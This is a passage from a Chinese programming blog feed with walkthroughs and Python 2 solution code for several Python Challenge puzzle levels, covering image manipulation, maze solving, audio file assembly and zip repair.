<p>循环右移13位的时候出现了正常的字符串in the face of what?这意思是this..<br>再看第一个提示this is an undocumented module，在python导入this模块试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The Zen of Python, by Tim Peters&#10;&#10;Beautiful is better than ugly.&#10;Explicit is better than implicit.&#10;Simple is better than complex.&#10;Complex is better than complicated.&#10;Flat is better than nested.&#10;Sparse is better than dense.&#10;Readability counts.&#10;Special cases aren&#39;t special enough to break the rules.&#10;Although practicality beats purity.&#10;Errors should never pass silently.&#10;Unless explicitly silenced.&#10;In the face of ambiguity, refuse the temptation to guess.&#10;There should be one-- and preferably only one --obvious way to do it.&#10;Although that way may not be obvious at first unless you&#39;re Dutch.&#10;Now is better than never.&#10;Although never is often better than *right* now.&#10;If the implementation is hard to explain, it&#39;s a bad idea.&#10;If the implementation is easy to explain, it may be a good idea.&#10;Namespaces are one honking great idea -- let&#39;s do more of those!</span><br></pre></td></tr></table></figure></p>
<p>In the face of ambiguity, refuse the temptation to guess.<br>答案:ambiguity</p>
<h3 id="python_challenge_24"><a href="http://www.pythonchallenge.com/pc/hex/ambiguity.html" target="_blank" rel="external">python challenge 24</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/ambiguity.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-24.png" alt="24"><br>这一关的图片是一张迷宫地图(641, 641)，只不过白色部分是迷宫的墙，深色部分是路。<br>用ps查看像素点，可以看出墙部分的RGB=(255,255,255)，路的RGB=(x,0,0)。<br>根据标题from top to bottom的提示，入口就是图片的右上角，出口就是图片的左下角。<br>用ps看下右上角的入口点：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-24-1.jpg" alt="24-1"><br>因此最开始通过getpixel(x, 0)[0]=0 找到入口点位置。<br>同理左下角出口点通过getpixel(x, 640)[0]=0 找到。<br>代码逻辑：<br>1.从入口点开始向四个方向找下个坐标点，找到后作为下一个入口点，并将当前像素点标白(255,255,255)<br>2.如果找到两个以上的下个出口坐标，即到了分岔口，备份之前的坐标队列,以此分岔口作为新的入口点,<br>3.如果未找到出口，则退回到上个分岔口继续查找。</p>
<p>最后生成的图片可以看到完成的迷宫路径：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-24-2.png" alt="24-2"><br>显然这还不是谜底，在仔细观察迷宫的路径，可以发现每个一个像素点，路径上的颜色就会变化，<br>将这些像素点的R通道数据用二进制写到文件，打开可以发现前两位是PK ，那么这些信息其实是构成了一个ZIP文件。<br>更改后缀，解压，里面有两个文件，maze.jpg和mybroken.zip，其中maze.jpg图片上的lake就是谜底了。<br>完整代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ambiguity</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> Image</span><br><span class="line">    org_img = Image.open(<span class="string">"img/maze.png"</span>).getdata()</span><br><span class="line">    org_img_size = org_img.size</span><br><span class="line">    new_img = Image.new(<span class="string">"RGBA"</span>, org_img_size, <span class="string">"black"</span>)</span><br><span class="line">    start_pos, end_pos = <span class="keyword">None</span>, <span class="keyword">None</span></span><br><span class="line">    start_pos_count, end_pos_count = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(org_img_size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> org_img.getpixel((x, <span class="number">0</span>))[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            start_pos = (x, <span class="number">0</span>)</span><br><span class="line">            start_pos_count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> org_img.getpixel((x, org_img_size[<span class="number">1</span>]-<span class="number">1</span>))[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            end_pos = (x, org_img_size[<span class="number">1</span>]-<span class="number">1</span>)</span><br><span class="line">            end_pos_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> start_pos <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> end_pos <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> start_pos_count != <span class="number">1</span> <span class="keyword">or</span> end_pos_count != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[error] : get start pos or end pos error!"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] start_pos: %s and end_pos: %s"</span> % (start_pos, end_pos)</span><br><span class="line"></span><br><span class="line">    path = []</span><br><span class="line">    whole_path = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右 下 左 上</span></span><br><span class="line">    dire = [(<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">1</span>), (-<span class="number">1</span>, <span class="number">0</span>), (<span class="number">0</span>, -<span class="number">1</span>)]</span><br><span class="line">    wall = (<span class="number">255</span>,)*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> start_pos != end_pos:</span><br><span class="line">        org_img.putpixel(start_pos, wall)</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        new_pos = start_pos</span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> dire:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                pp = (start_pos[<span class="number">0</span>]+offset[<span class="number">0</span>], start_pos[<span class="number">1</span>]+offset[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span> org_img.getpixel(pp) != wall:</span><br><span class="line">                    flag += <span class="number">1</span></span><br><span class="line">                    new_pos = pp</span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">print</span> str(e)</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># 未找到下个出口</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> path:</span><br><span class="line">                path = whole_path.pop()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            start_pos = path[<span class="number">0</span>]</span><br><span class="line">            path = []</span><br><span class="line">        <span class="comment"># 分岔口,找到多个像素点,备份之前的坐标队列,以此分岔口作为新的入口点</span></span><br><span class="line">        <span class="keyword">elif</span> flag &gt; <span class="number">1</span>:</span><br><span class="line">            whole_path.append(path)</span><br><span class="line">            path = [start_pos]</span><br><span class="line">            start_pos = new_pos</span><br><span class="line">        <span class="comment"># 找到唯一出口,flag = 1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            path.append(start_pos)</span><br><span class="line">            start_pos = new_pos</span><br><span class="line"></span><br><span class="line">    path.append(start_pos)</span><br><span class="line">    whole_path.append(path)</span><br><span class="line"></span><br><span class="line">    org_img = Image.open(<span class="string">"img/maze.png"</span>).getdata()</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> whole_path:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> path:</span><br><span class="line">            new_img.putpixel(k, wall)</span><br><span class="line">            data.append(org_img.getpixel(k)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    out = open(<span class="string">"files/out24.zip"</span>, <span class="string">"wb"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="number">1</span>::<span class="number">2</span>]:</span><br><span class="line">        out.write(chr(i))</span><br><span class="line">    out.close()</span><br><span class="line">    new_img.save(<span class="string">"img/out24.png"</span>)</span><br></pre></td></tr></table></figure></p>
<p>该题解迷宫逻辑参考<a href="http://blog.csdn.net/qaswe/article/details/9953133" target="_blank" rel="external">PythonChallenge 挑战之路 Level-24</a></p>
<h3 id="python_challenge_25"><a href="http://www.pythonchallenge.com/pc/hex/lake.html" target="_blank" rel="external">python challenge 25</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/lake.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-25.jpg" alt="25"><br>谷歌大法好：<br>这是一幅拼图模样的图片，根据网页源码里的提示can you see the waves?，这一关还要用到wave模块。<br>把URL后缀改为lake1.wav，lake2.wav，…，lake25会得到25个wav文件。<br>每个wav文件为10800字节，将三个作为一个像素，可得到一张10800/3=60x60大小的图片。<br>这25个wav文件对应着刚才的25块拼图，把这25个wav文件的内容依次拼起来，会得到一张300x300大小的图片。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lake</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">import</span> wave</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">"Authorization"</span>: <span class="string">"Basic %s"</span> % base64.encodestring(<span class="string">"butter:fly"</span>).replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">            &#125;</span><br><span class="line">    wave_url = <span class="string">'http://www.pythonchallenge.com/pc/hex/lake%i.wav'</span></span><br><span class="line">    new_img = Image.new(<span class="string">'RGB'</span>, (<span class="number">300</span>, <span class="number">300</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"%i/%i"</span> % (i + <span class="number">1</span>, <span class="number">25</span>)</span><br><span class="line">        wave_content = requests.get(wave_url % (i + <span class="number">1</span>), headers=headers).content</span><br><span class="line">        data = wave.open(StringIO.StringIO(wave_content))</span><br><span class="line">        patch = Image.fromstring(<span class="string">'RGB'</span>, (<span class="number">60</span>, <span class="number">60</span>), data.readframes(data.getnframes()))</span><br><span class="line">        pos = (<span class="number">60</span> * (i % <span class="number">5</span>), <span class="number">60</span> * (i / <span class="number">5</span>))</span><br><span class="line">        new_img.paste(patch, pos)</span><br><span class="line"></span><br><span class="line">    new_img.save(<span class="string">"img/out25.jpg"</span>)</span><br></pre></td></tr></table></figure></p>
<p>最终得到的图片中单词为最后答案：decent<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-25-decent.jpg" alt="25-decent"></p>
<h3 id="python_challenge_26"><a href="http://www.pythonchallenge.com/pc/hex/decent.html" target="_blank" rel="external">python challenge 26</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/decent.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-26.jpg" alt="26"><br>看网页源码中的提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.be a man - apologize!&#10;2.you&#39;ve got his e-mail&#10;3.Hurry up, I&#39;m missing the boat</span><br></pre></td></tr></table></figure></p>
<p>提示让你先发邮件去道歉，邮箱哪里来，看19关的源码中有段没有用到的记录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">From: leopold.moz@pythonchallenge.com&#10;Subject: what do you mean by &#34;open the attachment?&#34;&#10;Mime-version: 1.0&#10;Content-type: Multipart/mixed; boundary=&#34;===============1295515792==&#34;&#10;&#10;It is so much easier for you, youngsters.&#10;Maybe my computer is out of order.&#10;I have a real work to do and I must know what&#39;s inside!&#10;...</span><br></pre></td></tr></table></figure></p>
<p>找到邮箱leopold.moz@pythonchallenge.com，要道歉，发送内容是什么？<br>看23关源码中没有用到的记录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TODO: do you owe someone an apology? now it is a good time to&#10;tell him that you are sorry. Please show good manners although&#10;it has nothing to do with this level.</span><br></pre></td></tr></table></figure></p>
<p>现在就可以去给leopold.moz@pythonchallenge.com发送内容为sorry的邮件。<br>python发邮件模块网上很多，就几行代码，这里我直接用我邮箱发，然后收到回复：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-26-sorry.jpg" alt="26-sorry"><br>从回复的邮件里得到了一个MD5值：bbb8b499a0eef99b52c7f13f4e78c24b以及<br>它提到的broken.zip文件。这个解压文件在24关中得到，在解压的时候会提示CRC效验失败，<br>也就是说缺少部分数据。但实际上用7z解压时候是可以解压出文件的。。但正常的过程应该是<br>这个MD5值应该就是那个broken.zip的MD5值，需要将原文件的每个字节枚举看得到的MD5<br>值是否为该MD5值，从而得到正确的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def decent():&#10;    import hashlib&#10;    f_content = open(&#34;files/mybroken.zip&#34;, &#34;rb&#34;).read()&#10;    for i in range(len(f_content)):&#10;        for j in range(256):&#10;            new_content = &#34;&#34;.join([f_content[:i], chr(j), f_content[i+1:]])&#10;            if hashlib.md5(new_content).hexdigest() == &#34;bbb8b499a0eef99b52c7f13f4e78c24b&#34;:&#10;                open(&#34;files/mybroken_new.zip&#34;, &#34;wb&#34;).write(new_content)&#10;                print &#34;offset %d -&#62; %d&#34; % (i, j)&#10;&#62;&#62;&#62; offset 1234 -&#62; 168</span><br></pre></td></tr></table></figure></p>
<p>最后解压正确的zip文件得到一张图片<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-26-mybroken.gif" alt="26-mybroken"><br>将得到的单词speed和提示Hurry up,I’m missing the boat组合起来得到下关答案speedboat</p>
<h3 id="python_challenge_27"><a href="http://www.pythonchallenge.com/pc/hex/speedboat.html" target="_blank" rel="external">python challenge 27</a></h3><p><code>http://www.pythonchallenge.com/pc/hex/speedboat.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-27.jpg" alt="27"><br>谷歌大法好，要利用调色板这些东西，调色板可参考<a href="http://www.360doc.com/content/10/0928/15/2790922_57060786.shtml" target="_blank" rel="external">调色板palette详解</a><br>首先查看源码，将zigzag.gif下载下来<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-27-zigzag.gif" alt="27-zigzag"><br>这时候每个像素的上的信息是调色板的索引号，然后就需要用实际的颜色替换索引号得到等价的图片信息。然后将这些数据与原图片信息对比，将不同的坐标点标记颜色，如新建一个黑底图片标白，最后得到一张图片。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-27-notword.png" alt="27-notword"><br>图片左边是not，右边是word，下边是busy?，中间是钥匙，合起来是not key word。<br>然后将两个图片不相同的字节放在一起，最后经过颜色替换索引号得到的图片不同的数据得到一个bz压缩文件，解压出来并找到那些关键字里面哪些不是key word打印出，最后得到答案。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def speedboat():&#10;    import Image&#10;    import string&#10;    import bz2&#10;    import keyword&#10;    img = Image.open(&#34;img/zigzag.gif&#34;)&#10;    img_content = img.tostring()&#10;    img_plt = img.palette.getdata()[1][::3]&#10;    trans = string.maketrans(&#34;&#34;.join([chr(i) for i in range(256)]), img_plt)&#10;    img_tran = img_content.translate(trans)&#10;&#10;    # compare&#10;    diff = [&#34;&#34;, &#34;&#34;]&#10;    img = Image.new(&#34;1&#34;, img.size, 0)&#10;    for i in range(1, len(img_content)):&#10;        if img_content[i] != img_tran[i-1]:&#10;            diff[0] += img_content[i]&#10;            diff[1] += img_tran[i-1]&#10;            img.putpixel(((i-1) % img.size[0], (i-1)/img.size[0]), 1)&#10;    img.save(&#34;img/out27.png&#34;)&#10;    text = bz2.decompress(diff[0])&#10;&#10;    # extract key&#10;    for i in text.split():&#10;        if not keyword.iskeyword(i):&#10;            print i&#10;&#10;&#62;&#62;&#62; ../ring/bell.html&#10;    repeat&#10;    switch&#10;    repeat&#10;    ../ring/bell.html&#10;    ../ring/bell.html&#10;    ../ring/bell.html&#10;&#9;...</span><br></pre></td></tr></table></figure></p>
<p>得到28关链接为<a href="http://www.pythonchallenge.com/pc/ring/bell.htm" target="_blank" rel="external">http://www.pythonchallenge.com/pc/ring/bell.htm</a><br>账户名repeat 密码是 switch</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>继续斗智斗勇中。已经开始谷歌大法好了。。</p>
<h3 id="python_challenge_21"><a href="">python challenge 21</a></h3><p><code>invader.zip</code><br><figure class]]>
    </summary>
    
      <category term="challenge" scheme="http://blog.idhyt.xyz/tags/challenge/"/>
    
      <category term="python" scheme="http://blog.idhyt.xyz/categories/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[python challenge 11-20]]></title>
    <link href="http://blog.idhyt.xyz/2015/08/10/5-python-challenge-11-20/"/>
    <id>http://blog.idhyt.xyz/2015/08/10/5-python-challenge-11-20/</id>
    <published>2015-08-10T09:34:11.000Z</published>
    <updated>2015-12-27T08:54:38.000Z</updated>
    <content type="html"><![CDATA[<p>接上边继续斗智斗勇中。越来越觉得智商不够用了。。</p>
<h3 id="python_challenge_11"><a href="http://www.pythonchallenge.com/pc/return/5808.html" target="_blank" rel="external">python challenge 11</a></h3><p><code>http://www.pythonchallenge.com/pc/return/5808.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-11.jpg" alt="11"><br>题目只有一张模糊的图片，源码也没什么提示，看页面title为odd even.<br>猜测这张模糊的图片是否是将两张图片合成的，因此将其奇偶坐标分离开.<br>分离坐标有四种情况，(odd, odd),(odd, even),(even, odd),(even, even).<br>我这里取双奇偶坐标(odd, odd)和(even, even).<br>在PIL库中，使用load函数的效果比使用putpixel和getpixel更高效，因此选择使用load函数.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def odd_even():&#10;    from PIL import Image&#10;    im = Image.open(&#34;img/python-challenge-11.jpg&#34;)&#10;    w, h = im.size&#10;&#10;    imgs = [Image.new(im.mode, (w / 2, h / 2)) for i in xrange(2)]&#10;    imgs_load = [img.load() for img in imgs]&#10;    org = im.load()&#10;&#10;    for i in xrange(w):&#10;        for j in xrange(h):&#10;            if (i + j) % 2 == 0:&#10;                org_pos = (i, j)&#10;                new_pos = (i / 2, j / 2)&#10;                imgs_load[i % 2][new_pos] = org[org_pos]&#10;&#10;    [imgs[i].save(&#39;img/python-challenge-11-%d.jpg&#39; % i) for i in xrange(2)]</span><br></pre></td></tr></table></figure></p>
<p>最后生成的两张图片是一样的<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-11-evil.jpg" alt="11-evil"><br>显示的单词evil即为答案。</p>
<h3 id="python_challenge_12"><a href="http://www.pythonchallenge.com/pc/return/evil.html" target="_blank" rel="external">python challenge 12</a></h3><p><code>http://www.pythonchallenge.com/pc/return/evil.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-12.jpg" alt="12"><br>一张没有什么异常的图片，查看下源码，注意看图片名字，evil1.jpg，这里应该尝试下evil2.jpg了。<br>evil2.jpg -&gt; not jpg –gfx<br>evil3.jpg -&gt; no more evils…<br>evil4.jpg -&gt; Bert is evil! go back!(只在ie中可看到)<br>根据这些提示，先将evil2.jpg改为evil2.gfx，得到这个文件<br>GFX文件格式：GFX是一套跨平台的图形生成包，是一种可用于交互的图形格式，详情百度下。<br>到这里就没有思路了，看了下提示才知道，原来原图那人把扑克牌分成5堆，要把那个gfx文件用分牌的方式分成5个文件。<br>gfx的第一个字节给第一个文件，第二个字节给第二个文件，第三个字节给第三个文件，第四个字节给第四个文件，第五个字节给第五个文件，第六个字节给第一个文件……<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def evil():&#10;    f = open(&#39;files/evil2.gfx&#39;, &#39;rb+&#39;)&#10;    content = f.read()&#10;    f.close()&#10;&#10;    for i in xrange(5):&#10;        f = open(&#39;files/evil2-%d.jpg&#39; % i, &#39;wb+&#39;)&#10;        f.write(content[i::5])&#10;        f.close()</span><br></pre></td></tr></table></figure></p>
<p>最后得到5张图片连接起来即为结果:disproportional<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-12-evil2.jpg" alt="12-evil2"></p>
<h3 id="python_challenge_13"><a href="http://www.pythonchallenge.com/pc/return/disproportional.html" target="_blank" rel="external">python challenge 13</a></h3><p><code>http://www.pythonchallenge.com/pc/return/disproportional.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-13.jpg" alt="13"><br>这个页面显示了一个电话按键，并且标题为call him，很明显是要拨打一个电话号码。<br>图片最下边提示phone that evil，再回头看那个evil4.jpg的提示，Bert is evil! go back!<br>所以是要打电话给Bert,怎么打，不可能用自己手机打吧！然后在页面到处点点，一不小心点到了5就进去了。<br>进入页面：<a href="http://www.pythonchallenge.com/pc/phonebook.php" target="_blank" rel="external">http://www.pythonchallenge.com/pc/phonebook.php</a><br>这是什么鬼，止步于此，开始度娘。。。<br>xmlrpc是使用http协议做为传输协议的rpc机制，使用xml文本的方式传输命令和数据blablabla…<br>反正就是要用到python的<a href="https://docs.python.org/2/library/xmlrpclib.html" target="_blank" rel="external">xmlrpclib模块</a>来连接这个php页面，然后查看其方法，其中有个名为phone方法就是答案。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def disproportional():&#10;    import xmlrpclib&#10;    xml_rpc = xmlrpclib.ServerProxy(&#34;http://www.pythonchallenge.com/pc/phonebook.php&#34;)&#10;    print xml_rpc.system.listMethods()&#10;    print xml_rpc.system.methodHelp(&#39;phone&#39;)&#10;    print xml_rpc.phone(&#39;Bert&#39;)&#10;&#62;&#62;&#62; [&#39;phone&#39;, &#39;system.listMethods&#39;, &#39;system.methodHelp&#39;, &#39;system.methodSignature&#39;, &#39;system.multicall&#39;, &#39;system.getCapabilities&#39;]&#10;    Returns the phone of a person&#10;    555-ITALY</span><br></pre></td></tr></table></figure></p>
<p>最后输入555-ITALY.html不行。。改为ITALY.html提示SMALL letters。。好吧。。italy.html</p>
<h3 id="python_challenge_14"><a href="http://www.pythonchallenge.com/pc/return/italy.html" target="_blank" rel="external">python challenge 14</a></h3><p><code>http://www.pythonchallenge.com/pc/return/italy.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-14.jpg" alt="14"><br>所有提示信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#26681;&#25454;&#32593;&#39029;&#26631;&#39064;&#30340;&#25552;&#31034;&#65306;walk around&#10;&#32593;&#39029;&#28304;&#30721;&#30340;&#25552;&#31034;&#65306;100*100 = (100+99+99+98) + (...&#10;&#19979;&#36793;&#37027;&#24352;&#22270;wire.png&#28857;&#24320;&#26631;&#39064;&#20026;10000*1</span><br></pre></td></tr></table></figure></p>
<p>先验证序列公式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 100*100 = (100+99+99+98) + (...&#10;items = [i + i-1 + i-1 + i-2 for i in xrange(100, 1, -2)]&#10;items_value = reduce(lambda x, y: x+y, items)&#10;print &#34;%d %d&#34; % (len(items), items_value)&#10;&#62;&#62;&#62; 50 10000</span><br></pre></td></tr></table></figure></p>
<p>可知该序列公式是正确的。<br>10000x1 = 100x100是否要重新组图，按照这个思路把10000个像素重组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image&#10;org_img = Image.open(&#39;img/wire.png&#39;)&#10;org_data = list(org_img.getdata())&#10;res_img = Image.new(org_img.mode, (100, 100))&#10;res_data = res_img.load()&#10;org_index = 0&#10;for i in xrange(100):&#10;    for j in xrange(100):&#10;        res_data[j, i] = org_data[org_index]&#10;        org_index += 1&#10;res_img.save(&#34;img/wire-0.png&#34;)</span><br></pre></td></tr></table></figure></p>
<p>最开始是按照先行后列的方式重组发现图片是反的，然后按照先列后行的方式重组，得到一个图片。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-14-bit.png" alt="14-bit"><br>万分欣喜，进入bit.html页面就傻了：you took the wrong curve.<br>真是个悲伤的故事。。。<br>下边就完全没有任何头绪，只要又要借助度娘了，最后得到的解题思路是：<br>将10000x1的那张图片按照序列化的格式进行重新生成100x100的图片，生成的逻辑是：<br>按照图片面包的方向，从右边开始，外向内绕圈圈，<br>先向一个方向走100个像素，然后转90度，走99个像素，再转90度，再走99个像素，再转90度，再走98个像素，这样就完成了一个圈。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def italy():&#10;    from PIL import Image&#10;    # 100*100 &#65309; &#65288;100 + 99 + 99 + 98)+(...&#10;    items = [[i, i-1, i-1, i-2] for i in xrange(100, 1, -2)]&#10;&#10;    org_img = Image.open(&#39;img/wire.png&#39;)&#10;    org_data = list(org_img.getdata())&#10;    new_img = Image.new(org_img.mode, (100, 100))&#10;    new_data = new_img.load()&#10;&#10;    index = 0&#10;    x = y = 0&#10;    for item in items:&#10;        for j in xrange(item[0]):&#10;            new_data[x, y] = org_data[index]&#10;            x += 1&#10;            index += 1&#10;        x -= 1&#10;        for j in xrange(item[1]):&#10;            new_data[x, y] = org_data[index]&#10;            y += 1&#10;            index += 1&#10;        y -= 1&#10;        for j in xrange(item[2]):&#10;            new_data[x, y] = org_data[index]&#10;            x -= 1&#10;            index += 1&#10;        x += 1&#10;        for j in xrange(item[3]):&#10;            new_data[x, y] = org_data[index]&#10;            y -= 1&#10;            index += 1&#10;        y += 1&#10;&#10;    new_img.save(&#39;img/wire-cat.png&#39;)</span><br></pre></td></tr></table></figure></p>
<p>最后得到了一张图片<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-14-cat.png" alt="14-cat"><br>然后输入cat.html进入页面，出现了两只猫的图片，并有一段说明：<br>and its name is uzi. you’ll hear from him later.<br>替换为uzi.html进入下一题，uzi不是小狗吗 = =!</p>
<h3 id="python_challenge_15"><a href="http://www.pythonchallenge.com/pc/return/uzi.html" target="_blank" rel="external">python challenge 15</a></h3><p><code>http://www.pythonchallenge.com/pc/return/uzi.html</code><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/python-challenge-15.jpg" alt="15"></p>
<p>先找到所有有用的提示：</p>
<ul>
<li>图片信息<br>1**6年1月26日<br>右下角2月份有29天 说明是闰年 且2月29日为周日</li>
<li>页面标题<br>whom 猜测应该是找人</li>
<li><p>网页源码<br>he ain’t the youngest, he is the second # 应该是找到一个年龄列表中第二年轻的<br>buy flowers for tomorrow # 结合1月26日应该是说明天即1月27日有事件发生</p>
</li>
<li><p>结合以上信息<br>应该是找到1**6年中的所有闰年，且2月29日为周一的时间中第二个年轻的年份，<br>然后加上1月27日得到一个事件时间，这个时间和一个人有关系。</p>
</li>
</ul>
